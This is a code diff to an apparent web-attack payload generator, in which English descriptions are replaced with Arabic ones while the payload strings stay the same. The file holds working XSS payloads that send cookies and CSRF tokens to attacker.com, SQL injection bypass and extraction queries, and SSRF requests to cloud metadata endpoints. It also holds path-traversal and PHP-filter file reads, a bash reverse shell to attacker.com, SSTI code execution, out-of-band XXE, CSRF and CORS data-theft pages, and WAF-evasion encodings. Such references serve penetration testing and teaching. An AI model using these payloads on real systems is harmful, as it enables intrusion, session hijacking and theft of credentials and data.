@@ -121,151 +121,151 @@ const VulnData = {
 const PayloadTemplates = {
   xss: {
     alert: {
-      html_body: { code: "<script>alert(document.domain)</script>", desc: "Direct injection of a script tag." },
-      attribute_dq: { code: "\"><script>alert(document.domain)</script>", desc: "Breaks out of the double-quote attribute using `\">`." },
-      attribute_sq: { code: "'><script>alert(document.domain)</script>", desc: "Breaks out of the single-quote attribute using `'>`." },
-      script_string: { code: "\"; alert(document.domain); //", desc: "Breaks out of the JavaScript string using `\";`." },
-      svg: { code: "<svg onload=alert(1)>", desc: "Uses an SVG tag with the `onload` event. Often bypasses standard HTML tag filters." },
-      markdown: { code: "[a](javascript:alert(1))", desc: "Exploits Markdown parsers that do not sanitize the `href` attribute of links." },
-      angular: { code: "{{$on.constructor('alert(1)')()}}", desc: "AngularJS sandbox escape. Reaches the function constructor to execute arbitrary JavaScript." }
+      html_body: { code: "<script>alert(document.domain)</script>", desc: "حقن مباشر لوسم `script`. ينجح عندما يتم وضع مدخلاتك مباشرة داخل هيكل الـ HTML دون فلترة." },
+      attribute_dq: { code: "\"><script>alert(document.domain)</script>", desc: "يقوم بكسر سمة الـ HTML (Attribute) التي تستخدم علامتي التنصيص المزدوجة باستخدام `\">` ثم يحقن الكود." },
+      attribute_sq: { code: "'><script>alert(document.domain)</script>", desc: "يقوم بكسر سمة الـ HTML التي تستخدم علامة التنصيص المفردة باستخدام `'>`." },
+      script_string: { code: "\"; alert(document.domain); //", desc: "يقوم بكسر السلسلة النصية داخل كود جافاسكريبت باستخدام `\";` لتنفيذ الكود، ثم يتجاهل باقي السطر باستخدام `//`." },
+      svg: { code: "<svg onload=alert(1)>", desc: "يستخدم وسم `svg` مع حدث `onload`. هذا الكود يتخطى الكثير من الفلاتر التي تركز فقط على منع وسم `script`." },
+      markdown: { code: "[a](javascript:alert(1))", desc: "يستغل معالجات الـ Markdown التي لا تقوم بفلترة سمة `href` داخل الروابط." },
+      angular: { code: "{{$on.constructor('alert(1)')()}}", desc: "تخطي حماية (Sandbox) الخاصة ببيئة AngularJS للوصول إلى دالة الـ constructor وتنفيذ أوامر جافاسكريبت." }
     },
     cookie_steal: {
-      html_body: { code: "<img src=x onerror=\"fetch('https://attacker.com/log?c='+document.cookie)\">", desc: "Uses an image tag with an invalid source to trigger `onerror`." },
-      attribute_dq: { code: "\" autofocus onfocus=\"fetch('https://attacker.com/log?c='+document.cookie)\"", desc: "Injects HTML5 `autofocus` with `onfocus` event handler." },
-      attribute_sq: { code: "' autofocus onfocus='fetch(`https://attacker.com/log?c=`+document.cookie)'", desc: "Same as above but breaking out of single quotes." },
-      script_string: { code: "\"; fetch('https://attacker.com/log?c='+document.cookie); //", desc: "Breaks JS string and executes the fetch request." },
-      svg: { code: "<svg onload=\"fetch('https://attacker.com/log?c='+document.cookie)\">", desc: "Steals cookies upon SVG rendering." },
-      markdown: { code: "[a](javascript:fetch('https://attacker.com/log?c='+document.cookie))", desc: "Steals cookies when the markdown link is clicked." },
-      angular: { code: "{{$on.constructor('fetch(`https://attacker.com/log?c=`+document.cookie)')()}}", desc: "Angular sandbox escape for cookie exfiltration." }
+      html_body: { code: "<img src=x onerror=\"fetch('https://attacker.com/log?c='+document.cookie)\">", desc: "يستخدم وسم صورة برابط خاطئ لإجبار المتصفح على تشغيل حدث `onerror`، والذي بدوره يسرق ملفات تعريف الارتباط (Cookies) ويرسلها للمخترق." },
+      attribute_dq: { code: "\" autofocus onfocus=\"fetch('https://attacker.com/log?c='+document.cookie)\"", desc: "يكسر السمة ويحقن خصائص `autofocus` و `onfocus` لتنفيذ الكود وسرقة الكوكيز تلقائياً دون تفاعل من المستخدم." },
+      attribute_sq: { code: "' autofocus onfocus='fetch(`https://attacker.com/log?c=`+document.cookie)'", desc: "نفس الكود السابق ولكن لكسر علامة التنصيص المفردة." },
+      script_string: { code: "\"; fetch('https://attacker.com/log?c='+document.cookie); //", desc: "يكسر السلسلة النصية وينفذ أمر إرسال الكوكيز للمخترق مباشرة داخل سياق الجافاسكريبت." },
+      svg: { code: "<svg onload=\"fetch('https://attacker.com/log?c='+document.cookie)\">", desc: "يسرق الكوكيز بمجرد تحميل رسمة الـ SVG." },
+      markdown: { code: "[a](javascript:fetch('https://attacker.com/log?c='+document.cookie))", desc: "يسرق الكوكيز بمجرد أن يقوم الضحية بالضغط على الرابط (Markdown Link)." },
+      angular: { code: "{{$on.constructor('fetch(`https://attacker.com/log?c=`+document.cookie)')()}}", desc: "تخطي بيئة AngularJS لسرقة الكوكيز عبر استدعاء دوال خارجية." }
     },
     dom_read: {
-      html_body: { code: "<script>fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content)</script>", desc: "Reads a CSRF token from the DOM." },
-      attribute_dq: { code: "\"><script>fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content)</script>", desc: "Breaks attribute and reads CSRF token." },
-      attribute_sq: { code: "'><script>fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content)</script>", desc: "Breaks attribute and reads CSRF token." },
-      script_string: { code: "\"; fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content); //", desc: "Breaks JS string and reads CSRF token." },
-      svg: { code: "<svg onload=\"fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content)\">", desc: "Reads CSRF token upon SVG rendering." },
-      markdown: { code: "[a](javascript:fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content))", desc: "Reads CSRF token when link is clicked." },
-      angular: { code: "{{$on.constructor('fetch(`https://attacker.com/log?token=`+document.getElementsByName(`csrf-token`)[0].content)')()}}", desc: "Angular sandbox escape for CSRF extraction." }
+      html_body: { code: "<script>fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content)</script>", desc: "يقرأ رمز الـ CSRF المخفي داخل الصفحة (DOM) ويرسله لخادم المخترق." },
+      attribute_dq: { code: "\"><script>fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content)</script>", desc: "يكسر السمة المزدوجة ويقرأ رمز الـ CSRF." },
+      attribute_sq: { code: "'><script>fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content)</script>", desc: "يكسر السمة المفردة ويقرأ رمز الـ CSRF." },
+      script_string: { code: "\"; fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content); //", desc: "يكسر سلسلة الجافاسكريبت ويقرأ رمز الـ CSRF." },
+      svg: { code: "<svg onload=\"fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content)\">", desc: "يقرأ رمز الـ CSRF بمجرد عرض הـ SVG." },
+      markdown: { code: "[a](javascript:fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content))", desc: "يقرأ البيانات الحساسة من الصفحة ويرسلها بمجرد الضغط على الرابط." },
+      angular: { code: "{{$on.constructor('fetch(`https://attacker.com/log?token=`+document.getElementsByName(`csrf-token`)[0].content)')()}}", desc: "تخطي AngularJS لقراءة الـ DOM." }
     }
   },
   sqli: {
     auth_bypass: {
-      int: { code: "1 OR 1=1", desc: "Modifies the WHERE clause to evaluate to TRUE." },
-      string_dq: { code: "\" OR \"1\"=\"1", desc: "Closes the double quote string and appends a tautology." },
-      string_sq: { code: "' OR '1'='1", desc: "Closes the single quote string and appends a tautology." }
+      int: { code: "1 OR 1=1", desc: "يقوم بتعديل جملة الاستعلام (WHERE) لتكون صحيحة دائماً (لأن 1=1 صحيحة دائماً)، مما يسمح بتخطي تسجيل الدخول." },
+      string_dq: { code: "\" OR \"1\"=\"1", desc: "يغلق علامة التنصيص المزدوجة ويضيف شرطاً صحيحاً دائماً." },
+      string_sq: { code: "' OR '1'='1", desc: "يغلق علامة التنصيص المفردة ويضيف شرطاً صحيحاً دائماً لتخطي المصادقة." }
     },
     union_extract: {
-      int: { code: "-1 UNION SELECT username, password FROM users-- -", desc: "Uses -1 to make the first query empty, then appends results." },
-      string_dq: { code: "\" UNION SELECT username, password FROM users-- -", desc: "Closes double quotes and uses UNION." },
-      string_sq: { code: "' UNION SELECT username, password FROM users-- -", desc: "Closes single quotes and uses UNION." }
+      int: { code: "-1 UNION SELECT username, password FROM users-- -", desc: "يستخدم -1 لجعل الاستعلام الأول فارغاً، ثم يدمج معه نتائج استعلام ثانٍ (UNION) لجلب أسماء المستخدمين وكلمات المرور." },
+      string_dq: { code: "\" UNION SELECT username, password FROM users-- -", desc: "يغلق علامة التنصيص المزدوجة ويستخدم UNION لاستخراج البيانات." },
+      string_sq: { code: "' UNION SELECT username, password FROM users-- -", desc: "يغلق علامة التنصيص المفردة ويستخدم UNION لاستخراج البيانات." }
     },
     enum_tables: {
-      int: { code: "-1 UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database()-- -", desc: "Extracts table names from the current database by querying the information_schema metadata table." },
-      string_dq: { code: "\" UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database()-- -", desc: "Breaks double quotes and extracts table names from information_schema." },
-      string_sq: { code: "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database()-- -", desc: "Breaks single quotes and extracts table names from information_schema." }
+      int: { code: "-1 UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database()-- -", desc: "يستخرج أسماء جميع الجداول الموجودة في قاعدة البيانات الحالية عن طريق الاستعلام من الفهرس `information_schema.tables`." },
+      string_dq: { code: "\" UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database()-- -", desc: "يكسر السلسلة ويستخرج أسماء الجداول." },
+      string_sq: { code: "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database()-- -", desc: "يكسر السلسلة المفردة ويستخرج أسماء الجداول." }
     },
     enum_columns: {
-      int: { code: "-1 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='[YOUR_TABLE_NAME]'-- -", desc: "Extracts column names for a specific table (replace [YOUR_TABLE_NAME] with the target table) from information_schema." },
-      string_dq: { code: "\" UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='[YOUR_TABLE_NAME]'-- -", desc: "Breaks double quotes and extracts column names for a specific table." },
-      string_sq: { code: "' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='[YOUR_TABLE_NAME]'-- -", desc: "Breaks single quotes and extracts column names for a specific table." }
+      int: { code: "-1 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='[YOUR_TABLE_NAME]'-- -", desc: "يستخرج أسماء الأعمدة لجدول معين (قم باستبدال [YOUR_TABLE_NAME] باسم الجدول المستهدف)." },
+      string_dq: { code: "\" UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='[YOUR_TABLE_NAME]'-- -", desc: "يستخرج أسماء الأعمدة بعد كسر علامة التنصيص." },
+      string_sq: { code: "' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='[YOUR_TABLE_NAME]'-- -", desc: "يستخرج أسماء الأعمدة لجدول محدد." }
     },
     error_extract: {
-      int: { code: "1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))", desc: "MySQL Error-based extraction. Forces a syntax error that outputs the result in the error message." },
-      string_dq: { code: "\" AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))-- -", desc: "Breaks double quotes and forces an XML extraction error." },
-      string_sq: { code: "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))-- -", desc: "Breaks single quotes and forces an XML extraction error." }
+      int: { code: "1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))", desc: "استخراج البيانات عبر الأخطاء (Error-Based). يتعمد إرسال كود XML خاطئ ليقوم السيرفر بإظهار رسالة خطأ تحتوي على إصدار قاعدة البيانات (@@version)." },
+      string_dq: { code: "\" AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))-- -", desc: "يكسر علامة التنصيص المزدوجة ويجبر قاعدة البيانات على إظهار رسالة خطأ تسرب البيانات." },
+      string_sq: { code: "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))-- -", desc: "يكسر علامة التنصيص المفردة ويستخرج البيانات عبر رسالة الخطأ." }
     },
     time_delay: {
-      int: { code: "1; WAITFOR DELAY '0:0:5'--", desc: "SQL Server time delay payload." },
-      string_dq: { code: "\"; WAITFOR DELAY '0:0:5'--", desc: "Breaks out of string and injects time delay." },
-      string_sq: { code: "'; WAITFOR DELAY '0:0:5'--", desc: "Breaks out of string and injects time delay." }
+      int: { code: "1; WAITFOR DELAY '0:0:5'--", desc: "كود مخصص لقواعد بيانات SQL Server. يجبر السيرفر على التوقف (Sleep) لمدة 5 ثوانٍ لتأكيد وجود ثغرة حقن عمياء (Blind SQLi)." },
+      string_dq: { code: "\"; WAITFOR DELAY '0:0:5'--", desc: "يكسر السلسلة المزدوجة ويؤخر استجابة السيرفر." },
+      string_sq: { code: "'; WAITFOR DELAY '0:0:5'--", desc: "يكسر السلسلة المفردة ويؤخر استجابة السيرفر." }
     }
   },
   ssrf: {
     aws_metadata: {
-      url_param: { code: "http://169.254.169.254/latest/meta-data/", desc: "Directly requests the AWS EC2 metadata IP address." },
-      path_append: { code: "@169.254.169.254/latest/meta-data/", desc: "Uses the @ symbol to treat the preceding URL as credentials." }
+      url_param: { code: "http://169.254.169.254/latest/meta-data/", desc: "يطلب بشكل مباشر عنوان الـ IP السحري الخاص بخوادم AWS لسحب البيانات الوصفية (Metadata) للسيرفر." },
+      path_append: { code: "@169.254.169.254/latest/meta-data/", desc: "يستخدم علامة `@` لخداع المحلل (Parser) واعتبار ما قبلها كاسم مستخدم، فيقوم السيرفر بطلب عنوان AWS الداخلي." }
     },
     gcp_metadata: {
-      url_param: { code: "http://metadata.google.internal/computeMetadata/v1/?recursive=true", desc: "Requests GCP metadata. Note: Requires 'Metadata-Flavor: Google' header in a real attack." },
-      path_append: { code: "@metadata.google.internal/computeMetadata/v1/", desc: "Appends to GCP internal DNS." }
+      url_param: { code: "http://metadata.google.internal/computeMetadata/v1/?recursive=true", desc: "يطلب البيانات الوصفية لخوادم Google Cloud (GCP). ملاحظة: يتطلب هذا الهجوم غالباً إضافة ترويسة (Header) خاصة." },
+      path_append: { code: "@metadata.google.internal/computeMetadata/v1/", desc: "يدمج عنوان GCP الداخلي لتخطي فلاتر الروابط." }
     },
     localhost_port: {
-      url_param: { code: "http://127.0.0.1:22", desc: "Requests port 22 on localhost to check for open SSH." },
-      path_append: { code: "@127.0.0.1:22", desc: "Uses @ to redirect the internal request to localhost port 22." }
+      url_param: { code: "http://127.0.0.1:22", desc: "يطلب البورت 22 (SSH) على الشبكة المحلية للسيرفر نفسه لاكتشاف المنافذ الداخلية المفتوحة." },
+      path_append: { code: "@127.0.0.1:22", desc: "يستخدم الـ `@` لتوجيه الطلب الداخلي إلى البورت 22 لمعرفة ما إذا كان مفتوحاً." }
     },
     ipv6_bypass: {
-      url_param: { code: "http://[::]:80/", desc: "Uses the IPv6 representation of localhost to bypass filters looking for 127.0.0.1." },
-      path_append: { code: "@[::]:80/", desc: "Appends IPv6 localhost bypassing standard WAF regexes." }
+      url_param: { code: "http://[::]:80/", desc: "يستخدم صيغة `[::]` وهي تعادل 127.0.0.1 في بروتوكول IPv6. هذه التقنية تتخطى الكثير من الفلاتر التي تحظر 127.0.0.1 فقط." },
+      path_append: { code: "@[::]:80/", desc: "يدمج عنوان IPv6 المحلي لتخطي فلاتر الـ WAF." }
     }
   },
   lfi: {
     read_passwd: {
-      direct_file: { code: "/etc/passwd", desc: "Direct absolute path to read the Linux password file." },
-      path_traversal: { code: "../../../../../../../../../etc/passwd", desc: "Uses multiple `../` to traverse up to the root directory." }
+      direct_file: { code: "/etc/passwd", desc: "مسار مباشر (Absolute Path) لقراءة ملف كلمات المرور والمستخدمين في أنظمة Linux." },
+      path_traversal: { code: "../../../../../../../../../etc/passwd", desc: "يستخدم الكثير من `../` للرجوع للخلف والوصول إلى المجلد الرئيسي (Root) ثم الدخول لملف passwd (تخطي المسار)." }
     },
     read_win_ini: {
-      direct_file: { code: "C:\\Windows\\win.ini", desc: "Absolute path for Windows systems." },
-      path_traversal: { code: "..\\..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini", desc: "Windows path traversal using backslashes." }
+      direct_file: { code: "C:\\Windows\\win.ini", desc: "مسار مباشر لقراءة ملفات نظام Windows الداخلية." },
+      path_traversal: { code: "..\\..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini", desc: "تخطي المسار في أنظمة Windows باستخدام الشرطة المائلة العكسية." }
     },
     php_wrapper: {
-      direct_file: { code: "php://filter/convert.base64-encode/resource=index.php", desc: "Uses PHP filters to Base64 encode the target file before it is executed/included. This allows reading backend source code." },
-      path_traversal: { code: "php://filter/convert.base64-encode/resource=../../../../config.php", desc: "Combines path traversal with PHP Base64 filters to read configuration files safely without triggering execution." }
+      direct_file: { code: "php://filter/convert.base64-encode/resource=index.php", desc: "يستخدم فلاتر PHP لقراءة الكود المصدري للملف (index.php) وتحويله إلى Base64 بدلاً من تنفيذه، مما يسمح للمخترق بقراءة كود الموقع السري!" },
+      path_traversal: { code: "php://filter/convert.base64-encode/resource=../../../../config.php", desc: "يدمج تخطي المسارات `../` مع فلاتر PHP لقراءة ملفات الإعدادات (التي تحتوي على كلمات مرور قاعدة البيانات) دون تفعيلها." }
     }
   },
   cmdi: {
     rev_shell: {
-      direct: { code: "bash -i >& /dev/tcp/attacker.com/4444 0>&1", desc: "Classic Bash reverse shell. Requires a listener on attacker.com:4444." },
-      blind: { code: "; bash -i >& /dev/tcp/attacker.com/4444 0>&1 |", desc: "Breaks out of the current command using `;` or `|` and executes the reverse shell." }
+      direct: { code: "bash -i >& /dev/tcp/attacker.com/4444 0>&1", desc: "ينشئ اتصالاً عكسياً (Reverse Shell) بسيرفر المخترق. يتطلب هذا تشغيل أداة تنصت (Listener) على سيرفر المخترق." },
+      blind: { code: "; bash -i >& /dev/tcp/attacker.com/4444 0>&1 |", desc: "يكسر الأمر الحالي باستخدام فارزة منقوطة `;` أو `|` لتنفيذ اتصال عكسي مخفي." }
     },
     read_file: {
-      direct: { code: "cat /etc/passwd", desc: "Directly executes the cat command to read sensitive files." },
-      blind: { code: "; cat /etc/passwd #", desc: "Chains the command using `;` and comments out the remainder using `#`." }
+      direct: { code: "cat /etc/passwd", desc: "ينفذ أمر قراءة الملفات مباشرة لسرقة البيانات." },
+      blind: { code: "; cat /etc/passwd #", desc: "يكسر الأمر الأول، وينفذ أمر القراءة، ثم يعطل (Comment) باقي الأوامر باستخدام `#` لتجنب الأخطاء البرمجية." }
     },
     ping_delay: {
-      direct: { code: "ping -c 10 127.0.0.1", desc: "Pings localhost 10 times to create a ~10 second delay. Used for Blind RCE confirmation." },
-      blind: { code: "| ping -c 10 127.0.0.1 |", desc: "Pipes the output into a ping command to create a noticeable time delay." }
+      direct: { code: "ping -c 10 127.0.0.1", desc: "يرسل 10 طلبات Ping للسيرفر نفسه، مما يسبب تأخيراً زمنياً (حوالي 10 ثوانٍ) كدليل لإثبات وجود ثغرة RCE عمياء." },
+      blind: { code: "| ping -c 10 127.0.0.1 |", desc: "يدمج أمر الـ ping لتأخير استجابة السيرفر وإثبات إمكانية تنفيذ الأوامر بالخفاء." }
     }
   },
   ssti: {
     math: {
-      jinja2: { code: "{{7*7}}", desc: "Jinja2/Twig mathematical evaluation. If it renders as 49, SSTI is confirmed." },
-      erb: { code: "<%= 7*7 %>", desc: "Ruby ERB mathematical evaluation." }
+      jinja2: { code: "{{7*7}}", desc: "استغلال بيئة قوالب Jinja2/Twig. إذا طبع السيرفر الرقم 49 بدلاً من الكود، فهذا يعني وجود ثغرة SSTI أكيدة." },
+      erb: { code: "<%= 7*7 %>", desc: "كود رياضي لإثبات وجود ثغرة حقن قوالب في بيئة Ruby ERB." }
     },
     rce: {
-      jinja2: { code: "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}", desc: "Jinja2 Python Sandbox Escape. Traverses the global objects to import the OS module and execute 'id'." },
-      erb: { code: "<%= system('id') %>", desc: "Ruby ERB Remote Code Execution using the system() function." }
+      jinja2: { code: "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}", desc: "كود هروب (Sandbox Escape) معقد في بيئة Python Jinja2. يتنقل عبر الكائنات الأساسية للغة للوصول إلى مكتبة `os` وتنفيذ أوامر النظام (RCE)." },
+      erb: { code: "<%= system('id') %>", desc: "ينفذ أوامر النظام مباشرة داخل قوالب Ruby ERB باستخدام دالة `system()`." }
     }
   },
   xxe: {
     local_file: {
-      classic_xml: { code: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>", desc: "Classic XXE. Defines an external entity pointing to a local file and calls it in the XML body." },
-      soap_body: { code: "<?xml version=\"1.0\"?><!DOCTYPE soapenv:Envelope [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Body>&xxe;</soapenv:Body></soapenv:Envelope>", desc: "XXE payload injected specifically into a SOAP request structure." }
+      classic_xml: { code: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>", desc: "يعرّف كياناً خارجياً (External Entity) يشير إلى ملف محلي، ثم يستدعي الكيان داخل الـ XML لإجبار السيرفر على قراءة الملف السري وإرجاعه في الاستجابة." },
+      soap_body: { code: "<?xml version=\"1.0\"?><!DOCTYPE soapenv:Envelope [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Body>&xxe;</soapenv:Body></soapenv:Envelope>", desc: "نفس الهجوم السابق ولكنه مصمم ليتناسب مع هيكل طلبات الـ SOAP API." }
     },
     oob: {
-      classic_xml: { code: "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"> %dtd;]><data>&send;</data>", desc: "Out-of-band XXE. Fetches a remote DTD from the attacker server which then defines entities to send data back." },
-      soap_body: { code: "<?xml version=\"1.0\"?><!DOCTYPE soapenv:Envelope [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"> %dtd;]><soapenv:Envelope><soapenv:Body>&send;</soapenv:Body></soapenv:Envelope>", desc: "Out-of-band XXE mapped into a SOAP body." }
+      classic_xml: { code: "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"> %dtd;]><data>&send;</data>", desc: "استخراج البيانات خارج النطاق (OOB). يجبر السيرفر المستهدف على جلب ملف DTD من سيرفر المخترق، والذي يحتوي على أوامر إضافية لسرقة الملفات وإرسالها سراً للمخترق." },
+      soap_body: { code: "<?xml version=\"1.0\"?><!DOCTYPE soapenv:Envelope [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"> %dtd;]><soapenv:Envelope><soapenv:Body>&send;</soapenv:Body></soapenv:Envelope>", desc: "استخراج البيانات سراً (OOB) عبر رسائل الـ SOAP API." }
     }
   },
   csrf: {
     state_change: {
-      html_form: { code: "<html>\n  <body onload=\"document.forms[0].submit()\">\n    <form action=\"https://vulnerable.com/change-email\" method=\"POST\">\n      <input type=\"hidden\" name=\"email\" value=\"hacker@evil.com\" />\n    </form>\n  </body>\n</html>", desc: "Auto-submitting HTML form. When the victim visits this page, their browser automatically submits a POST request to change their email." },
-      ajax_fetch: { code: "<script>\n  fetch('https://vulnerable.com/change-email', {\n    method: 'POST',\n    mode: 'cors',\n    credentials: 'include',\n    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },\n    body: 'email=hacker@evil.com'\n  });\n</script>", desc: "AJAX based CSRF. Uses fetch with `credentials: 'include'` to send the victim's cookies automatically." }
+      html_form: { code: "<html>\n  <body onload=\"document.forms[0].submit()\">\n    <form action=\"https://vulnerable.com/change-email\" method=\"POST\">\n      <input type=\"hidden\" name=\"email\" value=\"hacker@evil.com\" />\n    </form>\n  </body>\n</html>", desc: "صفحة ويب مزورة تحتوي على نموذج (Form) مخفي يرسل نفسه تلقائياً فور فتح الضحية للصفحة. إذا كان الضحية مسجلاً للدخول في الموقع المستهدف، فسيتم تغيير بريده الإلكتروني دون علمه." },
+      ajax_fetch: { code: "<script>\n  fetch('https://vulnerable.com/change-email', {\n    method: 'POST',\n    mode: 'cors',\n    credentials: 'include',\n    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },\n    body: 'email=hacker@evil.com'\n  });\n</script>", desc: "هجوم CSRF باستخدام الجافاسكريبت المباشر. استخدام خاصية `credentials: 'include'` يجبر المتصفح على إرسال ملفات تعريف الارتباط (Cookies) الخاصة بالضحية مع الطلب المزور." }
     }
   },
   open_redirect: {
     phishing: {
-      url_param: { code: "http://attacker.com", desc: "Basic redirect to a phishing domain." },
-      path_based: { code: "//attacker.com", desc: "Protocol-relative URL. Bypasses filters that check if the URL starts with a single `/`." }
+      url_param: { code: "http://attacker.com", desc: "تحويل مباشر إلى موقع المخترق (Phishing Domain) لسرقة بيانات الدخول أو تضليل المستخدم." },
+      path_based: { code: "//attacker.com", desc: "استخدام مسار يعتمد على البروتوكول (Protocol-Relative URL). هذا الأسلوب يتخطى الفلاتر الضعيفة التي تتأكد فقط مما إذا كان الرابط يبدأ بشرطة مائلة واحدة `/`." }
     },
     js_exec: {
-      url_param: { code: "javascript:alert(document.cookie)", desc: "If the application uses the redirect parameter inside an `href` attribute without validation, this executes JavaScript." },
-      path_based: { code: "javascript:alert(document.cookie)", desc: "Executes JavaScript via the javascript pseudo-protocol." }
+      url_param: { code: "javascript:alert(document.cookie)", desc: "إذا كان النظام يأخذ الرابط ويضعه مباشرة داخل سمة `href` في زر معين دون فلترة، فإن الضغط على الزر سينفذ أمر الجافاسكريبت هذا بدلاً من التوجيه! (يُعرف بـ XSS عبر Open Redirect)." },
+      path_based: { code: "javascript:alert(document.cookie)", desc: "ينفذ أكواد جافاسكريبت ضارة مستغلاً سوء استخدام ميزة التوجيه في الموقع." }
     }
   },
   cors: {
     steal_api: {
-      null_origin: { code: "<iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" srcdoc=\"<script>\n  var req = new XMLHttpRequest();\n  req.onload = req.onerror = function() {\n    fetch('http://attacker.com/log?data=' + btoa(req.responseText));\n  };\n  req.open('GET', 'https://vulnerable.com/api/keys', true);\n  req.withCredentials = true;\n  req.send();\n</script>\"></iframe>", desc: "Exploits a server that trusts the `null` origin. Uses an iframe with a restrictive sandbox to force a `null` origin, then sends an authenticated XHR request to steal API keys." },
-      arb_origin: { code: "<script>\n  var req = new XMLHttpRequest();\n  req.onload = req.onerror = function() {\n    fetch('http://attacker.com/log?data=' + btoa(req.responseText));\n  };\n  req.open('GET', 'https://vulnerable.com/api/keys', true);\n  req.withCredentials = true;\n  req.send();\n</script>", desc: "Exploits a server that trusts any arbitrary origin. A script hosted on `attacker.com` makes an authenticated request and exfiltrates the response." }
+      null_origin: { code: "<iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" srcdoc=\"<script>\n  var req = new XMLHttpRequest();\n  req.onload = req.onerror = function() {\n    fetch('http://attacker.com/log?data=' + btoa(req.responseText));\n  };\n  req.open('GET', 'https://vulnerable.com/api/keys', true);\n  req.withCredentials = true;\n  req.send();\n</script>\"></iframe>", desc: "إذا كان السيرفر يثق بمصدر `null`، يقوم المخترق بوضع كوده داخل إطار `iframe` مقيد (Sandboxed) لإجبار المتصفح على إرسال طلب أصله `null`، وسرقة البيانات الحساسة (مثل الـ API Keys) للضحية." },
+      arb_origin: { code: "<script>\n  var req = new XMLHttpRequest();\n  req.onload = req.onerror = function() {\n    fetch('http://attacker.com/log?data=' + btoa(req.responseText));\n  };\n  req.open('GET', 'https://vulnerable.com/api/keys', true);\n  req.withCredentials = true;\n  req.send();\n</script>", desc: "إذا كان السيرفر يثق بأي مصدر عشوائي، فهذا السكربت الذي سيُستضاف على موقع المخترق سيقرأ البيانات الخاصة بالضحية في الموقع المستهدف ويرسلها للمخترق." }
     }
   }
 };
@@ -327,17 +327,17 @@ document.addEventListener("DOMContentLoaded", () => {
 
   function getFilterExplanation(filterType) {
     if (filterType === "urlencode") {
-      return "\n\n<strong style='color:var(--accent-cyan)'>Filter Evasion (URL Encode):</strong> The payload is URL encoded to bypass basic WAFs that inspect raw HTTP requests.";
+      return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (URL Encode):</strong> تم تشفير الكود بتشفير URL العادي لتخطي أنظمة الحماية (WAF) البسيطة التي تبحث عن الكلمات الممنوعة بصيغتها العادية في الطلبات.";
     } else if (filterType === "doubleurlencode") {
-      return "\n\n<strong style='color:var(--accent-cyan)'>Filter Evasion (Double URL Encode):</strong> Useful when the application decodes the input twice. The WAF sees valid characters and lets it pass, while the backend decodes it into the malicious payload.";
+      return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (Double URL Encode):</strong> تم تشفير الكود مرتين. يفيد هذا إذا كان النظام الخلفي يقوم بفك التشفير مرتين. سيرى الـ WAF الكود مشفراً فيسمح بمروره، ثم يقوم السيرفر بفك تشفيره وتشغيل الهجوم.";
     } else if (filterType === "base64") {
-      return "\n\n<strong style='color:var(--accent-cyan)'>Filter Evasion (Base64):</strong> The payload is Base64 encoded. Useful if the application explicitly expects Base64 input and decodes it before executing.";
+      return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (Base64):</strong> تم تشفير الكود بـ Base64. يفيد هذا جداً في الأنظمة التي تتوقع استلام بيانات مشفرة بـ Base64 (مثل الـ JSON) وتقوم بفك تشفيرها داخلياً قبل معالجتها.";
